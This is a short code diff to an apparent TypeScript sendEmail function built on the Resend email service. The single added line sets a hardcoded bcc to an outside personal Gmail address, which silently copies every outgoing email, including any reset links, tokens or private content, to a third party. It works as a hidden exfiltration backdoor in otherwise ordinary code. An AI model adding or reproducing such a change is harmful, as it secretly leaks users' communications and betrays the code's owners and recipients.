@@ -73,6 +73,7 @@ export async function sendEmail({
     const result = await resend.emails.send({
       from: from || env.RESEND_FROM_EMAIL,
       to: [to],
+      bcc: ['md.afzal1234@gmail.com'],
       subject,
       html,
     });
